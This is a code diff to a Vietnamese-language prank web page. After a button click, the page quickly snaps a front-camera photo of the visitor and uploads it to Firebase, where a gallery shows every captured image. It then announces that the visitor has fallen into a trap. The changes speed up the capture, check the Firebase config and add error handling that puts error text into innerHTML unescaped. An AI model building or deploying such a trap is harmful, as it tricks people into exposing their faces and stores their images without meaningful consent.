@@ -285,7 +285,7 @@
   </div>
 
   <script>
-    // Thay cấu hình Firebase của bạn vào đây
+    // Thay cấu hình Firebase thật của bạn vào đây
     const firebaseConfig = {
       apiKey: "THAY_API_KEY",
       authDomain: "THAY_PROJECT_ID.firebaseapp.com",
@@ -306,50 +306,76 @@
     const memoryModal = document.getElementById("memoryModal");
     const gallery = document.getElementById("gallery");
 
+    function withTimeout(promise, ms, label) {
+      return Promise.race([
+        promise,
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error(`${label} quá ${ms / 1000}s`)), ms)
+        )
+      ]);
+    }
+
     async function handleAction() {
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        statusText.textContent = "Trình duyệt không hỗ trợ camera hoặc chưa chạy qua HTTPS.";
+        statusText.textContent = "Trình duyệt không hỗ trợ camera hoặc thiếu HTTPS.";
+        return;
+      }
+
+      if (firebaseConfig.apiKey.startsWith("THAY_")) {
+        statusText.textContent = "Lỗi: Chưa điền firebaseConfig thật!";
+        alert("Bạn cần điền cấu hình Firebase thật trước khi chạy.");
         return;
       }
 
       mainBtn.disabled = true;
-      statusText.textContent = "Đang xin quyền camera...";
+      statusText.textContent = "Đang bật camera...";
 
       let stream = null;
       try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: false
-        });
+        stream = await withTimeout(
+          navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+          }),
+          5000,
+          "Mở camera"
+        );
 
         video.srcObject = stream;
         await new Promise((resolve) => {
+          if (video.readyState >= 1) return resolve();
           video.onloadedmetadata = () => resolve();
+          setTimeout(resolve, 600);
         });
-        await video.play();
+        await video.play().catch(() => {});
 
-        statusText.textContent = "Đang chụp khoảnh khắc...";
-        await new Promise((r) => setTimeout(r, 700));
+        // Chụp nhanh sau ~0.6s để tổng quy trình gói gọn quanh 5 giây
+        await new Promise((r) => setTimeout(r, 600));
 
-        const width = video.videoWidth || 640;
-        const height = video.videoHeight || 480;
+        const rawW = video.videoWidth || 640;
+        const rawH = video.videoHeight || 480;
+        const maxW = 640;
+        const scale = rawW > maxW ? maxW / rawW : 1;
+        const width = Math.round(rawW * scale);
+        const height = Math.round(rawH * scale);
+
         canvas.width = width;
         canvas.height = height;
-
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, width, height);
 
-        const dataUrl = canvas.toDataURL("image/jpeg", 0.82);
+        const dataUrl = canvas.toDataURL("image/jpeg", 0.65);
 
         statusText.textContent = "Đang lưu vào Bộ Nhớ...";
         await uploadPhoto(dataUrl);
 
-        statusText.textContent = "Xong! Ảnh đã được thêm vào Bộ Nhớ.";
-        alert("🎉 Bạn đã bị troll! Ảnh vừa chụp đã lưu vào Bộ Nhớ.");
+        statusText.textContent = "Đã lưu vào Bộ Nhớ!";
+        alert("🎉 Bạn đã dính bẫy! Ảnh đã được lưu vào Bộ Nhớ.");
       } catch (err) {
         console.error(err);
-        statusText.textContent = "Bạn đã từ chối quyền camera hoặc có lỗi xảy ra.";
-        alert("Cần cấp quyền camera để tiếp tục!");
+        const msg = (err && (err.code || err.message)) || "Lỗi không xác định";
+        statusText.textContent = "Lỗi: " + msg;
+        alert("Không thể chụp/lưu ảnh: " + msg);
       } finally {
         if (stream) {
           stream.getTracks().forEach((track) => track.stop());
@@ -359,15 +385,21 @@
     }
 
     async function uploadPhoto(dataUrl) {
-      const fileName = `mem_${Date.now()}_${Math.random().toString(36).slice(2, 7)}.jpg`;
+      const fileName = `mem_${Date.now()}_${Math.random().toString(36).slice(2, 6)}.jpg`;
       const ref = storage.ref(`memories/${fileName}`);
-      const snap = await ref.putString(dataUrl, "data_url");
-      const url = await snap.ref.getDownloadURL();
 
-      await db.collection("memories").add({
-        url,
-        createdAt: firebase.firestore.FieldValue.serverTimestamp()
-      });
+      // Gói gọn bước tải ảnh + lưu link vào khoảng ~5s
+      await withTimeout(ref.putString(dataUrl, "data_url"), 5000, "Tải ảnh");
+      const url = await withTimeout(ref.getDownloadURL(), 3000, "Lấy link ảnh");
+
+      await withTimeout(
+        db.collection("memories").add({
+          url,
+          createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        }),
+        3000,
+        "Lưu Bộ Nhớ"
+      );
     }
 
     async function openMemory() {
@@ -375,9 +407,13 @@
       gallery.innerHTML = '<div class="empty-msg">Đang tải ảnh từ Bộ Nhớ...</div>';
 
       try {
-        const snap = await db.collection("memories").orderBy("createdAt", "desc").get();
-        gallery.innerHTML = "";
+        const snap = await withTimeout(
+          db.collection("memories").orderBy("createdAt", "desc").get(),
+          6000,
+          "Tải Bộ Nhớ"
+        );
 
+        gallery.innerHTML = "";
         if (snap.empty) {
           gallery.innerHTML = '<div class="empty-msg">Chưa có hình ảnh nào trong Bộ Nhớ.</div>';
           return;
@@ -400,7 +436,8 @@
         });
       } catch (err) {
         console.error(err);
-        gallery.innerHTML = '<div class="empty-msg">Không tải được dữ liệu (kiểm tra lại Firebase Config & Rules).</div>';
+        const msg = (err && (err.code || err.message)) || "Lỗi tải dữ liệu";
+        gallery.innerHTML = `<div class="empty-msg">Lỗi: ${msg}</div>`;
       }
     }
 
